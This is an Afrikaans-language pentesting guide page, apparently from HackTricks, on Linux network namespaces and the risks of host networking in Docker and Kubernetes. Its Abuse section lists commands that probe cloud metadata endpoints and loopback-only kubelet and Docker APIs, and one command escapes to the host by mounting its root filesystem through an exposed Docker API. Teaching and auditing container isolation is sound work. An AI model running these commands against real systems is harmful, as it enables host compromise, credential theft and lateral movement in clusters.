# Netwerk-naamruimte

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die netwerk-naamruimte isoleer netwerkverwante hulpbronne soos interfaces, IP-adresse, roetetabelle, ARP/neighbor-status, firewall-reëls, sockets, en die inhoud van lêers soos `/proc/net`. Dit is hoekom 'n container kan hê wat soos sy eie `eth0`, sy eie plaaslike roetes, en sy eie loopback device lyk sonder om die host se werklike netwerkstapel te besit.

Wat sekuriteit betref, maak dit saak omdat netwerkisolasie oor veel meer gaan as net port binding. 'n Private netwerk-naamruimte beperk wat die workload direk kan waarneem of herkonfigureer. Sodra daardie naamruimte met die host gedeel word, kan die container skielik sigbaarheid kry in host listeners, host-local services, en netwerkbeheerpunte wat nooit bedoel was om aan die toepassing geopenbaar te word nie.

## Werking

'n Pasgeskepte netwerk-naamruimte begin met 'n leë of byna leë netwerkomgewing totdat interfaces daaraan aangeheg word. Container runtimes skep of koppel dan virtual interfaces, ken adresse toe, en konfigureer roetes sodat die workload die verwagte konnektiwiteit het. In bridge-based deployments beteken dit gewoonlik dat die container 'n veth-backed interface sien wat aan 'n host bridge gekoppel is. In Kubernetes hanteer CNI plugins die ekwivalente opstelling vir Pod networking.

Hierdie argitektuur verduidelik waarom `--network=host` of `hostNetwork: true` so 'n dramatiese verandering is. In plaas daarvan om 'n voorbereide private netwerkstapel te ontvang, sluit die workload by die host se werklike een aan.

## Lab

Jy kan 'n byna leë netwerk-naamruimte sien met:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
En jy kan normale en host-networked containers vergelyk met:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Die host-networked container het nie meer sy eie geïsoleerde socket- en koppelvlak-uitsig nie. Daardie verandering alleen is alreeds beduidend voordat jy selfs vra watter capabilities die proses het.

## Runtime Usage

Docker en Podman skep normaalweg 'n private netwerk-naamruimte vir elke container, tensy anders gekonfigureer. Kubernetes gee gewoonlik elke Pod sy eie netwerk-naamruimte, gedeel deur die containers binne daardie Pod maar geskei van die host. Incus/LXC-stelsels bied ook ryk isolasie gebaseer op netwerk-naamruimtes, dikwels met 'n wyer verskeidenheid virtuele netwerkopstellings.

Die algemene beginsel is dat privaat netwerking die standaard isolasiegrens is, terwyl host networking 'n eksplisiete opt-out van daardie grens is.

## Miskonfigurasies

Die belangrikste miskonfigurasie is eenvoudig om die host network namespace te deel. Dit word soms gedoen vir prestasie, laagvlak monitoring, of gerief, maar dit verwyder een van die skoonste grense wat aan containers beskikbaar is. Host-lokale luisteraars word op 'n meer direkte manier bereikbaar, localhost-only dienste kan toeganklik raak, en capabilities soos `CAP_NET_ADMIN` of `CAP_NET_RAW` word veel gevaarliker omdat die operasies wat hulle moontlik maak nou op die host se eie netwerk-omgewing toegepas word.

Nog 'n probleem is om te veel netwerkverwante capabilities toe te ken selfs wanneer die netwerk-naamruimte privaat is. 'n Private naamruimte help wel, maar dit maak raw sockets of gevorderde netwerkbeheer nie onskadelik nie.

In Kubernetes verander `hostNetwork: true` ook hoeveel vertroue jy in Pod-vlak netwerksegmentasie kan plaas. Kubernetes dokumenteer dat baie netwerk-plugins nie behoorlik `hostNetwork` Pod-verkeer vir `podSelector` / `namespaceSelector` matching kan onderskei nie en dit daarom as gewone node-verkeer beskou. Vanuit 'n aanvaller se oogpunt beteken dit dat 'n aangetasde `hostNetwork` workload dikwels as 'n node-level netwerk-foothold behandel moet word eerder as 'n normale Pod wat nog deur dieselfde beleidsaanname vasgehou word as overlay-network workloads.

## Abuse

In swak geïsoleerde opstellings kan aanvallers host-luisterende dienste inspekteer, bestuur-endpunte bereik wat slegs aan loopback gebind is, sniff of met verkeer inmeng afhangend van die presiese capabilities en omgewing, of routing en firewall-staat herkonfigureer as `CAP_NET_ADMIN` teenwoordig is. In 'n cluster kan dit ook laterale beweging en control-plane reconnaissance vergemaklik.

As jy vermoed dat host networking gebruik word, begin deur te bevestig dat die sigbare interfaces en luisteraars aan die host behoort in plaas van aan 'n geïsoleerde container-netwerk:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Loopback-only dienste is dikwels die eerste interessante ontdekking:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
As netwerkvermoëns teenwoordig is, toets of die workload die sigbare stack kan inspekteer of verander:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Op moderne kernels kan host networking plus `CAP_NET_ADMIN` ook die pakketpad blootstel buite eenvoudige `iptables` / `nftables`-veranderinge. `tc` qdiscs en filters is ook namespace-scoped, sodat hulle in 'n gedeelde host network namespace van toepassing is op die host-koppelvlakke wat die container kan sien. As `CAP_BPF` ook teenwoordig is, word netwerkverwante eBPF-programme soos TC en XDP loaders ook relevant:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Dit maak saak omdat 'n aanvaller dalk verkeer op die host interface-vlak kan mirror, redirect, shape of drop, en nie net firewall-reëls kan herskryf nie. In 'n private network namespace is daardie aksies tot die container view beperk; in 'n shared host namespace raak dit host-impacting.

In cluster- of cloud-omgewings regverdig host networking ook vinnige plaaslike recon van metadata en control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Volledige voorbeeld: Host Networking + Local Runtime / Kubelet Access

Host networking gee nie outomaties host root nie, maar dit openbaar dikwels dienste wat bedoel is om slegs vanaf die node self bereik te word. As een van daardie dienste swak beskerm is, word host networking 'n direkte privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet op localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impak:

- direkte gasheerkompromittering indien 'n local runtime API blootgestel word sonder behoorlike beskerming
- cluster-verkenning of laterale beweging indien kubelet of local agents bereikbaar is
- verkeersmanipulasie of denial of service wanneer gekombineer met `CAP_NET_ADMIN`

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die proses 'n private netwerkstapel het, watter roetes en luisteraars sigbaar is, en of die netwerk-oorsig reeds gasheer-agtig lyk voordat jy selfs capabilities toets.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
- As `/proc/self/ns/net` en `/proc/1/ns/net` reeds host-like lyk, kan die container die host network namespace of 'n ander nie-private namespace deel.
- `lsns -t net` en `ip netns identify` is nuttig wanneer die shell reeds binne 'n named of persistent namespace is en jy dit wil korreleer met `/run/netns` objects vanaf die host-kant.
- `ss -lntup` is veral waardevol omdat dit loopback-only listeners en local management endpoints openbaar.
- Routes, interface names, firewall context, `tc` state, en eBPF attachments word veel belangriker as `CAP_NET_ADMIN`, `CAP_NET_RAW`, of `CAP_BPF` teenwoordig is.
- In Kubernetes kan failed service-name resolution vanaf 'n `hostNetwork` Pod bloot beteken dat die Pod nie `dnsPolicy: ClusterFirstWithHostNet` gebruik nie, nie dat die service afwesig is nie.

Wanneer jy 'n container hersien, evalueer altyd die network namespace saam met die capability set. Host networking plus sterk network capabilities is 'n baie ander houding as bridge networking plus 'n noue default capability set.

## Verwysings

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
